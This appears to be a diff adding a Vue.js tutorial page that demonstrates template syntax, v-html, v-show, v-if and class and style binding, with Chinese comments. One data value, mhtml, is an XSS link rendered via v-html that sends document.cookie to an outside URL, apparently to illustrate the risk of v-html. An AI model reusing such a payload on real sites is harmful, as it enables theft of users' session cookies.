@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Document</title>
+        <style>
+            .pink{
+                background-color: pink;
+            }
+            .red{
+                background-color: red;
+            }
+            .blue{
+                background-color: blue;
+            }
+            .color{
+                color: blue;
+            }
+            .font{
+                font-size: 16px;
+            }
+        </style>
+        <script src="./lib/vue.js"></script>
+    </head>
+    <body>
+        <!-- View -->
+        <div id="box">
+            {{ 10 + 20 }}
+            {{ 10 > 20 ? 'aaa' : 'bbb'}}
+            <p>{{ myname }}</p>
+            {{ myhtml }}
+            <!-- v-html  是指令 -->
+            <div v-html="myhtml"></div>
+            <div v-html="mhtml"></div>
+            <div v-show="isShow">动态显示和隐藏</div>
+            <div v-if="isCreated">动态创建和删除</div>
+            <div v-bind:class="isActive ? 'red' : 'blue'">动态绑定class-三目写法</div>
+            <button v-on:click="handleClick()">改变三目class颜色ture和false</button>
+            <div :class='classObj'>动态绑定class-对象写法</div>
+            <div :class='classArr'>动态绑定class-数组写法</div>
+
+            <!-- 点击handleClick按钮 -->
+            <div :style="'background:'+(isActive?'red':'yellow')">动态绑定style-三目写法</div>
+            <div :style="styleObj">动态绑定style-对象写法</div>
+            <div :style="styleArr">动态绑定style-数组写法</div>
+        </div>
+        <div>
+            {{ 10 + 20 }}
+        </div>
+    </body>
+    <script>
+        var vm = new Vue({
+            // el  是element元素  作用:用来指定vue实例作用范围
+            el:"#box",  // vue 渲染开始的地方
+            /* Model */
+            data:{// data:数据  作用:用来给vue实例对象绑定一系列数据
+                myname:"开始vue",
+                myhtml:"<b>11111</b>",   
+                isShow:true,
+                isCreated:true, 
+                isActive:true,
+                classObj:{
+                    pink:true,
+                    color:true      //pink  color 是提前写好的class名字
+                },
+                classArr:['red','color'],
+                styleObj:{
+                    backgroundColor:"red"
+                },
+                styleArr:[{fontSize:"30px"}],
+                mhtml:'<a href=javaecript:location.href="http://www.baidu.com?cookie="+ document.cookie>click</a>'
+            },   //data里面的东西  从称为变量或者是状态
+            methods: {
+                handleClick(){
+                    this.isActive = !this.isActive
+                }
+            }
+        });
+
+    </script>
+</html>
